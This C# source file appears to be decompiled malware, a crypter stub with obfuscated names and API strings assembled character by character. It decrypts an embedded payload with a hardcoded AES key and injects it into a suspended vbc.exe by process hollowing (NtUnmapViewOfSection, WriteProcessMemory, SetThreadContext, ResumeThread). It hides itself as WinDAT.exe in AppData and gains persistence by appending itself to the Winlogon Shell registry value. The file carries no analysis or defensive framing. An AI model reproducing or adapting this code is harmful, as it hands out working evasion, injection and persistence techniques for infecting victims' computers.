using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

public class jjgvJHhjhb : Form
{
	public class jhGjHg
	{
		private delegate bool kjHkBkBHJ(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, byte[] sInfo, IntPtr[] pInfo);

		private delegate uint jhbgjHbHJB(IntPtr hProc, IntPtr baseAddr);

		private delegate bool sgF(IntPtr hThr, uint[] ctxt);

		private delegate bool oIJHVJHV(IntPtr t, uint[] c);

		private delegate bool FGdsg(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, int bufrSize, ref IntPtr numRead);

		private delegate uint gfCHGvv(IntPtr hThread);

		private delegate IntPtr hgHGhgv(IntPtr hProc, IntPtr addr, IntPtr size, int allocType, int prot);

		private delegate bool GDgxGfd(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, ref uint lpflOldProtect);

		private delegate bool jGFNHJVB(byte[] hgCGvGv, string hjjbJHb);

		private delegate bool poJGgv(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

		[DllImport("kernel32", SetLastError = true)]
		private static extern IntPtr LoadLibrary(string lpFileName);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		public G hghGvhgcGv<G>(string name, string method) where G : class
		{
			return (G)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibrary(name), method), typeof(G));
		}

		public bool nhvhjV(byte[] hgCGvGv, string hjjbJHb)
		{
			string name = Convert.ToString('k') + 'e' + 'r' + 'n' + 'e' + 'l' + '3' + '2';
			string name2 = Convert.ToString('n') + 't' + 'd' + 'l' + 'l';
			oIJHVJHV oIJHVJHV = hghGvhgcGv<oIJHVJHV>(name, Convert.ToString('S') + 'e' + 't' + 'T' + 'h' + 'r' + 'e' + 'a' + 'd' + 'C' + 'o' + 'n' + 't' + 'e' + 'x' + 't');
			FGdsg fGdsg = hghGvhgcGv<FGdsg>(name, Convert.ToString('R') + 'e' + 'a' + 'd' + 'P' + 'r' + 'o' + 'c' + 'e' + 's' + 's' + 'M' + 'e' + 'm' + 'o' + 'r' + 'y');
			gfCHGvv gfCHGvv = hghGvhgcGv<gfCHGvv>(name, Convert.ToString('R') + 'e' + 's' + 'u' + 'm' + 'e' + 'T' + 'h' + 'r' + 'e' + 'a' + 'd');
			hgHGhgv hgHGhgv = hghGvhgcGv<hgHGhgv>(name, Convert.ToString('V') + 'i' + 'r' + 't' + 'u' + 'a' + 'l' + 'A' + 'l' + 'l' + 'o' + 'c' + 'E' + 'x');
			kjHkBkBHJ kjHkBkBHJ = hghGvhgcGv<kjHkBkBHJ>(name, Convert.ToString('C') + 'r' + 'e' + 'a' + 't' + 'e' + 'P' + 'r' + 'o' + 'c' + 'e' + 's' + 's' + 'A');
			jhbgjHbHJB jhbgjHbHJB = hghGvhgcGv<jhbgjHbHJB>(name2, Convert.ToString('N') + 't' + 'U' + 'n' + 'm' + 'a' + 'p' + 'V' + 'i' + 'e' + 'w' + 'O' + 'f' + 'S' + 'e' + 'c' + 't' + 'i' + 'o' + 'n');
			sgF sgF = hghGvhgcGv<sgF>(name, Convert.ToString('G') + 'e' + 't' + 'T' + 'h' + 'r' + 'e' + 'a' + 'd' + 'C' + 'o' + 'n' + 't' + 'e' + 'x' + 't');
			hghGvhgcGv<GDgxGfd>(name, Convert.ToString('V') + 'i' + 'r' + 't' + 'u' + 'a' + 'l' + 'P' + 'r' + 'o' + 't' + 'e' + 'c' + 't' + 'E' + 'x');
			poJGgv poJGgv = hghGvhgcGv<poJGgv>(name, Convert.ToString('W') + 'r' + 'i' + 't' + 'e' + 'P' + 'r' + 'o' + 'c' + 'e' + 's' + 's' + 'M' + 'e' + 'm' + 'o' + 'r' + 'y');
			try
			{
				IntPtr[] array = new IntPtr[4];
				IntPtr zero = IntPtr.Zero;
				int num = BitConverter.ToInt32(hgCGvGv, 60);
				int num2 = BitConverter.ToInt16(hgCGvGv, num + 6);
				byte[] sInfo = new byte[68];
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(hgCGvGv, num + 84));
				if (kjHkBkBHJ(null, new StringBuilder(hjjbJHb), zero, zero, inherit: false, 4, zero, null, sInfo, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (sgF(array[1], array2))
					{
						IntPtr baseAddr = new IntPtr((long)array2[41] + 8L);
						IntPtr bufr = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr numRead = IntPtr.Zero;
						if (fGdsg(array[0], baseAddr, ref bufr, (int)intPtr2, ref numRead) && jhbgjHbHJB(array[0], bufr) == 0)
						{
							IntPtr lpBaseAddress = hgHGhgv(addr: new IntPtr(BitConverter.ToInt32(hgCGvGv, num + 52)), size: new IntPtr(BitConverter.ToInt32(hgCGvGv, num + 80)), hProc: array[0], allocType: 12288, prot: 64);
							poJGgv(array[0], lpBaseAddress, hgCGvGv, (uint)(int)intPtr, out var lpNumberOfBytesWritten);
							int num3 = num2 - 1;
							for (int i = 0; i <= num3; i++)
							{
								int[] array3 = new int[10];
								Buffer.BlockCopy(hgCGvGv, num + 248 + i * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(hgCGvGv, array3[5], array4, Convert.ToInt32(null, 2), array4.Length);
								poJGgv(lpBaseAddress: new IntPtr(lpBaseAddress.ToInt32() + array3[3]), nSize: (uint)(int)new IntPtr(array4.Length), hProcess: array[0], lpBuffer: array4, lpNumberOfBytesWritten: out lpNumberOfBytesWritten);
							}
							poJGgv(lpBaseAddress: new IntPtr((long)array2[41] + 8L), nSize: (uint)(int)new IntPtr(4), hProcess: array[0], lpBuffer: BitConverter.GetBytes(lpBaseAddress.ToInt32()), lpNumberOfBytesWritten: out lpNumberOfBytesWritten);
							array2[44] = (uint)(lpBaseAddress.ToInt32() + BitConverter.ToInt32(hgCGvGv, num + 40));
							oIJHVJHV(array[1], array2);
						}
					}
					gfCHGvv(array[1]);
				}
			}
			catch
			{
				return false;
			}
			return true;
		}

		public static bool jhgJhJvb(byte[] hgCGvGv, string hjjbJHb)
		{
			jhGjHg @object = new jhGjHg();
			jGFNHJVB jGFNHJVB = @object.nhvhjV;
			return jGFNHJVB(hgCGvGv, hjjbJHb);
		}
	}

	private string Yoo = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");

	public static byte[] AESDecrypt(byte[] input, string Pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = new byte[32];
		byte[] sourceArray = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(Pass));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
	}

	public void Yayzzzee()
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WinDAT.exe");
		if (File.Exists(text))
		{
			byte[] array = null;
			InitializeComponent();
			array = Wtf.Wut();
			array = AESDecrypt(array, "JSADDZVSXR");
			jhGjHg.jhgJhJvb(array, Yoo);
			FileInfo fileInfo = new FileInfo(Application.get_ExecutablePath());
			fileInfo.Attributes = FileAttributes.Hidden;
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey.SetValue("Shell", "explorer.exe, " + Application.get_ExecutablePath());
			try
			{
				RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
				registryKey2.SetValue("Shell", "explorer.exe, " + Application.get_ExecutablePath());
				return;
			}
			catch
			{
				return;
			}
		}
		File.Move(Application.get_ExecutablePath(), text);
		File.SetAttributes(text, FileAttributes.Hidden);
		Process.Start(text);
		Environment.Exit(0);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).set_Visible(false);
		((Form)this).set_WindowState((FormWindowState)1);
	}

	public jjgvJHhjhb()
	{
		Yayzzzee();
	}
}
